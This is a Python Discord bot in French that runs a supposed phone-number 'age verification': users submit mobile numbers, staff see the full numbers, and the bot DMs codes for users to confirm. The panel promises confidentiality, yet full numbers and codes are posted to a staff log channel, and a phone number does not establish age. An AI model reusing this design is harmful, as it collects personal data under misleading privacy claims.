import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import datetime
import os
import logging
from typing import Optional, Dict

from aiohttp import web

import config
from utils import validate_phone, mask_phone, generate_code, validate_code

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("VerifBot")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ─── Data stores ───
cooldowns: Dict[int, float] = {}
verification_states: Dict[int, dict] = {}   # user_id -> {phone, claimed_by, code}
pending_codes: Dict[int, dict] = {}          # user_id -> {code, phone, claimed_by}

EMBED_COLOR   = 0x5865F2  # Blurple
EMBED_GREEN   = 0x57F287
EMBED_RED     = 0xED4245
EMBED_ORANGE  = 0xFEE75C

# ═══════════════════════════════════════════════════════════
#  HEALTH CHECK
# ═══════════════════════════════════════════════════════════
async def health_handler(request):
    return web.Response(text="OK", status=200)

async def start_health_server():
    app = web.Application()
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", config.PORT)
    await site.start()
    log.info(f"Health check server on port {config.PORT}")

# ═══════════════════════════════════════════════════════════
#  LOGS COMPLETS
# ═══════════════════════════════════════════════════════════
async def send_log(title: str, description: str, color: int = EMBED_COLOR,
                   fields: list = None, user: discord.User = None, staff: discord.User = None):
    channel = bot.get_channel(config.LOG_CHANNEL_ID)
    if not channel:
        return

    embed = discord.Embed(
        title=title,
        description=description,
        color=color,
        timestamp=datetime.datetime.now()
    )
    if fields:
        for name, value, inline in fields:
            embed.add_field(name=name, value=value, inline=inline)
    if user:
        embed.set_thumbnail(url=user.display_avatar.url)
    embed.set_footer(text=f"Logs • {datetime.datetime.now().strftime('%d/%m/%Y %H:%M')}")

    await channel.send(embed=embed)

# ═══════════════════════════════════════════════════════════
#  MODAL
# ═══════════════════════════════════════════════════════════
class PhoneModal(discord.ui.Modal, title="📱 Vérification d'âge"):
    phone = discord.ui.TextInput(
        label="Numéro de téléphone",
        placeholder="0612345678",
        min_length=10,
        max_length=10,
        required=True,
    )

    async def on_submit(self, interaction: discord.Interaction):
        now = datetime.datetime.now().timestamp()

        # ── Cooldown ──
        if interaction.user.id in cooldowns:
            remaining = cooldowns[interaction.user.id] + config.COOLDOWN_SECONDS - now
            if remaining > 0:
                embed = discord.Embed(
                    title="⏳ Cooldown",
                    description=f"Veuillez attendre **{int(remaining)} secondes** avant de réessayer.",
                    color=EMBED_ORANGE
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return

        # ── Vérification déjà en cours ──
        if interaction.user.id in verification_states:
            embed = discord.Embed(
                title="⏳ Vérification déjà en cours",
                description="Vous avez déjà une vérification en attente. Veuillez patienter.",
                color=EMBED_ORANGE
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        # ── Validation téléphone ──
        phone_raw = self.phone.value.strip().replace(" ", "").replace("-", "")
        valid, err_msg = validate_phone(phone_raw)

        if not valid:
            embed = discord.Embed(title="❌ Numéro invalide", description=err_msg, color=EMBED_RED)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        # ✅ Valide
        cooldowns[interaction.user.id] = now

        embed_wait = discord.Embed(
            title="📩 Code envoyé",
            description=(
                "Vous allez recevoir un **code de vérification** dans les **5 minutes**.\n\n"
                "**Aucun débit** (0,00 €).\n\n"
                "⏱️ Veuillez patienter pendant le traitement par un membre du staff."
            ),
            color=EMBED_GREEN
        )
        embed_wait.set_footer(text="Système de vérification • 0,00 €")
        await interaction.response.send_message(embed=embed_wait, ephemeral=True)

        # Log : nouvelle vérification
        await send_log(
            title="📋 Nouvelle vérification",
            description=f"**{interaction.user}** a demandé une vérification.",
            color=EMBED_COLOR,
            user=interaction.user,
            fields=[
                ("👤 Pseudo", str(interaction.user), True),
                ("🆔 ID", f"`{interaction.user.id}`", True),
                ("📱 Numéro", f"`{mask_phone(phone_raw)}`", False),
                ("🕐 Date", datetime.datetime.now().strftime('%d/%m/%Y %H:%M'), False)
            ]
        )

        # Envoyer panel staff
        await send_staff_panel(interaction.user, phone_raw)

    async def on_error(self, interaction: discord.Interaction, error: Exception) -> None:
        log.error(f"Modal error: {error}")
        embed = discord.Embed(title="❌ Erreur", description="Une erreur est survenue. Réessaye.", color=EMBED_RED)
        await interaction.response.send_message(embed=embed, ephemeral=True)


# ═══════════════════════════════════════════════════════════
#  PANEL STAFF
# ═══════════════════════════════════════════════════════════
class StaffPanelView(discord.ui.View):
    def __init__(self, user_id: int, phone: str):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.phone = phone
        self.claimed_by: Optional[int] = None
        self.code_sent = False
        self.code_value: Optional[str] = None

    @discord.ui.button(label="📋 Claim", style=discord.ButtonStyle.primary, custom_id="claim")
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is not None:
            embed = discord.Embed(
                title="❌ Déjà claim",
                description=f"Cette vérification est déjà claim par <@{self.claimed_by}>.",
                color=EMBED_RED
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        self.claimed_by = interaction.user.id

        # Message éphémère avec numéro complet
        embed_reveal = discord.Embed(
            title="📱 Numéro dévoilé",
            description=f"```\n{self.phone}\n```",
            color=EMBED_GREEN,
            timestamp=datetime.datetime.now()
        )
        embed_reveal.set_footer(text="Ne partagez pas ce numéro")
        await interaction.response.send_message(embed=embed_reveal, ephemeral=True)

        # Mise à jour du panel
        await self.update_panel(interaction, f"Claimé par **{interaction.user.name}**")

        # Log : claim
        await send_log(
            title="📋 Vérification claim",
            description=f"**{interaction.user.name}** a claim la vérification de <@{self.user_id}>.",
            color=EMBED_GREEN,
            fields=[
                ("👮 Staff", f"<@{interaction.user.id}> (`{interaction.user.id}`)", True),
                ("👤 Utilisateur", f"<@{self.user_id}> (`{self.user_id}`)", True),
                ("📱 Numéro", f"||{self.phone}||", False)
            ]
        )

    @discord.ui.button(label="🔑 Code", style=discord.ButtonStyle.success, custom_id="code")
    async def code_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is None:
            embed = discord.Embed(title="❌ Personne n'a claim",
                description="Un staff doit d'abord **Claim** avant d'envoyer le code.", color=EMBED_ORANGE)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        if self.claimed_by != interaction.user.id:
            embed = discord.Embed(title="❌ Pas ton claim",
                description=f"Seul <@{self.claimed_by}> peut envoyer le code.", color=EMBED_RED)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        if self.code_sent:
            embed = discord.Embed(title="⚠️ Code déjà envoyé",
                description="Un code a déjà été envoyé.", color=EMBED_ORANGE)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        self.code_value = generate_code()
        self.code_sent = True

        # Stocker dans pending_codes
        pending_codes[self.user_id] = {
            "code": self.code_value,
            "phone": self.phone,
            "claimed_by": interaction.user.id
        }

        embed_waiting = discord.Embed(
            title="⏳ En attente de la réponse de l'utilisateur...",
            description=f"Un code à 4 chiffres a été envoyé par MP à <@{self.user_id}>.",
            color=EMBED_ORANGE,
            timestamp=datetime.datetime.now()
        )
        embed_waiting.set_footer(text="Le code sera validé automatiquement")
        await interaction.response.send_message(embed=embed_waiting, ephemeral=True)

        # DM à l'user
        try:
            user = await bot.fetch_user(self.user_id)
            embed_dm = discord.Embed(
                title="🔐 Code de vérification",
                description=f"**Votre code : `{self.code_value}`**\n\n"
                            "Veuillez répondre à **ce message** avec le code.\n\n"
                            "⚠️ Ne partagez ce code avec personne.",
                color=EMBED_COLOR
            )
            embed_dm.set_footer(text="Répondez uniquement avec le code à 4 chiffres")
            await user.send(embed=embed_dm)

            # Log : code envoyé
            await send_log(
                title="🔑 Code envoyé",
                description=f"Code envoyé à <@{self.user_id}> par **{interaction.user.name}**.",
                color=EMBED_ORANGE,
                user=user,
                fields=[
                    ("👤 Utilisateur", f"<@{self.user_id}>", True),
                    ("👮 Staff", f"<@{interaction.user.id}>", True),
                    ("🔐 Code", f"||{self.code_value}||", False),
                    ("📱 Numéro", f"||{self.phone}||", False)
                ]
            )

        except discord.Forbidden:
            log.warning(f"DM fermés pour {self.user_id}")
            embed_fail = discord.Embed(title="❌ Échec DM",
                description=f"<@{self.user_id}> a ses DMs fermés.", color=EMBED_RED)
            await interaction.followup.send(embed=embed_fail, ephemeral=True)
            self.code_sent = False
            pending_codes.pop(self.user_id, None)
            self.code_value = None
            return

        await self.update_panel(interaction, f"Code envoyé par **{interaction.user.name}** • En attente...")

    @discord.ui.button(label="❌ Close", style=discord.ButtonStyle.danger, custom_id="close")
    async def close_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed_by is not None and self.claimed_by != interaction.user.id:
            embed = discord.Embed(title="❌ Pas ton claim",
                description=f"Seul <@{self.claimed_by}> peut fermer.", color=EMBED_RED)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        # Nettoyage
        pending_codes.pop(self.user_id, None)
        verification_states.pop(self.user_id, None)

        for child in self.children:
            if isinstance(child, discord.ui.Button):
                child.disabled = True

        embed = discord.Embed(
            title="🔒 Vérification fermée",
            description=f"Fermée par **{interaction.user.name}**",
            color=EMBED_RED,
            timestamp=datetime.datetime.now()
        )
        embed.set_footer(text="Vérification annulée")
        await interaction.response.edit_message(embed=embed, view=self)

        # Log : close
        await send_log(
            title="🔒 Vérification fermée",
            description=f"Vérification de <@{self.user_id}> fermée par **{interaction.user.name}**.",
            color=EMBED_RED,
            fields=[
                ("👤 Utilisateur", f"<@{self.user_id}> (`{self.user_id}`)", True),
                ("👮 Staff", f"<@{interaction.user.id}> (`{interaction.user.id}`)", True),
                ("📱 Numéro", f"`{mask_phone(self.phone)}`", False)
            ]
        )

    async def update_panel(self, interaction: discord.Interaction, status_text: str):
        embed = discord.Embed(
            title="📋 Vérification en cours",
            color=EMBED_COLOR,
            timestamp=datetime.datetime.now()
        )
        embed.add_field(name="👤 Pseudo", value=f"<@{self.user_id}>", inline=True)
        embed.add_field(name="🆔 ID", value=f"`{self.user_id}`", inline=True)
        embed.add_field(name="📱 Numéro", value=f"`{mask_phone(self.phone)}`", inline=False)
        embed.add_field(name="📌 Statut", value=status_text, inline=False)

        try:
            user = await bot.fetch_user(self.user_id)
            embed.set_thumbnail(url=user.display_avatar.url)
        except:
            pass

        embed.set_footer(text=f"Système de Vérification • {datetime.datetime.now().strftime('%d/%m/%Y %H:%M')}")
        await interaction.message.edit(embed=embed, view=self)


# ═══════════════════════════════════════════════════════════
#  ENVOI PANEL STAFF
# ═══════════════════════════════════════════════════════════
async def send_staff_panel(user: discord.User, phone: str):
    guild = bot.get_guild(config.STAFF_GUILD_ID)
    if not guild:
        log.error(f"Staff guild {config.STAFF_GUILD_ID} introuvable.")
        return

    channel = guild.get_channel(config.STAFF_CHANNEL_ID)
    if not channel:
        log.error(f"Staff channel {config.STAFF_CHANNEL_ID} introuvable.")
        return

    view = StaffPanelView(user.id, phone)
    verification_states[user.id] = {"phone": phone, "view": view}

    embed = discord.Embed(
        title="📋 Nouvelle vérification",
        color=EMBED_COLOR,
        timestamp=datetime.datetime.now()
    )
    embed.add_field(name="👤 Pseudo", value=str(user), inline=True)
    embed.add_field(name="🆔 ID", value=f"`{user.id}`", inline=True)
    embed.add_field(name="📱 Numéro", value=f"`{mask_phone(phone)}`", inline=False)
    embed.add_field(name="📌 Statut", value="En attente de claim...", inline=False)
    embed.set_thumbnail(url=user.display_avatar.url if user.avatar else user.default_avatar.url)
    embed.set_footer(text=f"Système de Vérification • {datetime.datetime.now().strftime('%d/%m/%Y %H:%M')}")

    await channel.send(content="@everyone", embed=embed, view=view)


# ═══════════════════════════════════════════════════════════
#  RÉCEPTION DU CODE EN DM
# ═══════════════════════════════════════════════════════════
async def handle_dm_code(message: discord.Message):
    user_id = message.author.id
    pending = pending_codes.get(user_id)

    if pending is None:
        return  # Rien en cours, on ignore

    content = message.content.strip()
    valid, err_msg = validate_code(content)

    if not valid:
        embed = discord.Embed(title="❌ Code invalide", description=err_msg, color=EMBED_RED)
        await message.channel.send(embed=embed)
        return

    # Comparer
    if content != pending["code"]:
        embed = discord.Embed(
            title="❌ Code incorrect",
            description="Le code que vous avez entré est incorrect. Veuillez réessayer.",
            color=EMBED_RED
        )
        await message.channel.send(embed=embed)
        return

    # ✅ CODE CORRECT !
    phone = pending["phone"]
    claimed_by = pending.get("claimed_by")
    pending_codes.pop(user_id, None)
    verification_states.pop(user_id, None)

    # ── Log : code validé ──
    embed_success = discord.Embed(
        title="✅ Vérification réussie !",
        description="Votre numéro de téléphone a été vérifié avec succès.\nMerci de votre patience.",
        color=EMBED_GREEN
    )
    await message.channel.send(embed=embed_success)

    await send_log(
        title="✅ Code validé",
        description=f"**{message.author.name}** a validé son code avec succès.",
        color=EMBED_GREEN,
        user=message.author,
        fields=[
            ("👤 Utilisateur", f"<@{user_id}> (`{user_id}`)", True),
            ("👮 Staff", f"<@{claimed_by}>" if claimed_by else "Inconnu", True),
            ("🔐 Code", f"||{content}||", True),
            ("📱 Numéro", f"||{phone}||", False),
            ("🕐 Validé le", datetime.datetime.now().strftime('%d/%m/%Y %H:%M'), False)
        ]
    )

    # ── Rôle auto ──
    if config.VERIFIED_ROLE_ID and config.GUILD_ID:
        guild = bot.get_guild(config.GUILD_ID)
        if guild:
            role = guild.get_role(config.VERIFIED_ROLE_ID)
            if role:
                member = guild.get_member(user_id)
                if member:
                    try:
                        await member.add_roles(role, reason="Vérification téléphone réussie")
                        log.info(f"Rôle {role.name} donné à {message.author.name}")
                    except discord.Forbidden:
                        log.warning(f"Permission manquante pour donner le rôle à {user_id}")
                        await send_log(
                            title="⚠️ Permission manquante",
                            description=f"Impossible de donner le rôle à <@{user_id}> (vérifier la hiérarchie des rôles).",
                            color=EMBED_ORANGE
                        )
                else:
                    log.warning(f"{user_id} n'est pas sur le serveur principal")
            else:
                log.warning(f"Rôle {config.VERIFIED_ROLE_ID} introuvable")

    # ── Ping staff dans le salon log ──
    log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
    if log_channel and claimed_by:
        await log_channel.send(
            content=f"<@{claimed_by}> ✅ Code validé pour <@{user_id}>",
            embed=discord.Embed(
                title="✅ Validation réussie",
                description=f"Code `{content}` validé par **{message.author.name}**",
                color=EMBED_GREEN
            )
        )


# ═══════════════════════════════════════════════════════════
#  SLASH COMMANDS
# ═══════════════════════════════════════════════════════════
@bot.tree.command(name="setup", description="Crée le panneau de vérification dans ce salon")
@app_commands.default_permissions(administrator=True)
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔞 Vérification d'âge",
        description=(
            "Pour accéder à ce serveur, vous devez vérifier votre âge.\n\n"
            "**Comment ça marche ?**\n"
            "1️⃣ Cliquez sur **Vérifier**\n"
            "2️⃣ Entrez votre numéro de téléphone (06/07)\n"
            "3️⃣ Un staff vous enverra un code par MP\n"
            "4️⃣ Validez le code\n\n"
            "🔒 **Vos données restent confidentielles**\n"
            "💰 **Aucun frais** — 0,00 €"
        ),
        color=EMBED_COLOR
    )
    embed.set_footer(text="Système de Vérification • Sécurisé")

    view = discord.ui.View(timeout=None)

    class VerifyButton(discord.ui.Button):
        def __init__(self):
            super().__init__(label="✅ Vérifier", style=discord.ButtonStyle.success, custom_id="verify_btn")

        async def callback(self, inter: discord.Interaction):
            await inter.response.send_modal(PhoneModal())

    view.add_item(VerifyButton())

    await interaction.response.send_message(embed=embed, view=view)


@bot.tree.command(name="sync", description="Sync les commandes slash")
@app_commands.default_permissions(administrator=True)
async def sync(interaction: discord.Interaction):
    await bot.tree.sync()
    embed = discord.Embed(title="✅ Commandes synchronisées", color=EMBED_GREEN)
    await interaction.response.send_message(embed=embed, ephemeral=True)


# ═══════════════════════════════════════════════════════════
#  EVENTS
# ═══════════════════════════════════════════════════════════
@bot.event
async def on_ready():
    log.info(f"✅ Connecté : {bot.user} (ID: {bot.user.id})")
    await bot.tree.sync()
    log.info("Commandes slash synchronisées.")
    asyncio.create_task(start_health_server())


@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return
    if isinstance(message.channel, discord.DMChannel):
        await handle_dm_code(message)


# ═══════════════════════════════════════════════════════════
#  LANCEMENT
# ═══════════════════════════════════════════════════════════
if __name__ == "__main__":
    if not config.BOT_TOKEN:
        log.critical("BOT_TOKEN manquant dans .env")
        exit(1)
    bot.run(config.BOT_TOKEN)